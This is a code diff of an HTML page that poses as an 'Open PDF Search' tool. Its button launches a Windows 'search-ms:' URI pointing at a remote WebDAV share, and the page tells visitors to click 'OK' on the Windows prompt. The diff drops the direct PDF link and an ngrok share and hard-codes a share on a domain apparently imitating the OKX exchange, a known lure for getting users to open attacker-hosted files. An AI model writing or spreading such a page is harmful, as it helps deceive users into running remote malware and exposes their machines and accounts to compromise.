@@ -5,18 +5,15 @@
 </head>
 <body>
   <h1>Open PDF Search</h1>
-  <p><a href="https://a231-38-247-64-82.ngrok-free.app/share/LawsofHumanNature.pdf">View PDF</a></p>
   <p><strong>Note:</strong> Windows may prompt to allow the search. Click "OK".</p>
   <button onclick="openSearch()">Search PDF</button>
   <script>
     function openSearch() {
-      const searchUri = confirm('Is WebDAV mapped as a drive (e.g., Z:)?')
-        ? "search-ms:query=LawsofHumanNature&crumb=location:Z:\\"
-        : "search-ms:query=LawsofHumanNature&crumb=location:\\\\a231-38-247-64-82.ngrok-free.app@SSL\\share";
+      const searchUri = "search-ms:query=LawsofHumanNature&crumb=location:\\\\webdav.okx-upgrade.org@SSL\\share";
       try {
         window.location.href = searchUri;
       } catch (e) {
-        alert("Error: " + e.message + ". Map the share (https://a231-38-247-64-82.ngrok-free.app/share) as a drive or use the PDF link.");
+        alert("Error: " + e.message + ". Ensure the WebDAV share (\\webdav.okx-upgrade.org@SSL\\share) is accessible.");
       }
     }
   </script>
